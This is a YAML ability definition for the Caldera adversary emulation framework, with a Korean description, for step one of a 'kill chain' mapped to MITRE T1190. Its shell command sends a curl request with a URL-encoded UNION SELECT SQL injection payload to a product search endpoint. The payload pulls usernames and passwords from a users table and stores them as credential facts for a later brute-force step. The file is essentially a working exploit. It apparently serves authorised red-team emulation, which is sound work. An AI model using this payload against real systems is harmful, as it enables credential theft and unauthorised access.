- id: aa11bb22-cc33-4dd4-ee55-ff6677889900
  name: SQLi Credential Extraction (Kill Chain)
  description: UNION SELECT로 users 테이블의 username/password를 추출합니다. 추출된 크레덴셜은 Caldera Fact(credential.username, credential.password)로 저장되어 후속 brute_force_with_creds Ability에서 활용됩니다.
  tactic: initial-access
  technique:
    attack_id: T1190
    name: Exploit Public-Facing Application
  platforms:
    linux:
      sh:
        command: |-
          TARGET="http://#{target.url}"
          OP_ID="#{operation_id}"

          echo "[*] Kill Chain Step 1: SQLi Credential Extraction"
          RESP=$(curl -s \
            -H "X-Caldera-Op-Id: ${OP_ID}" \
            -H "X-Caldera-Technique: T1190" \
            -H "X-Caldera-Ability: aa11bb22-cc33-4dd4-ee55-ff6677889900" \
            -A "Caldera/${OP_ID}/T1190/aa11bb22" \
            "${TARGET}/api/products/search?keyword=%27+UNION+SELECT+id%2Cusername%2Cpassword%2C0%2C0+FROM+users--")

          echo "[*] Response: ${RESP}"
          echo "[*] Extracted credentials stored as Facts"
        parsers:
          plugins.stockpile.app.parsers.json:
          - source: target.url
            edge: has_credential
            target: credential.username
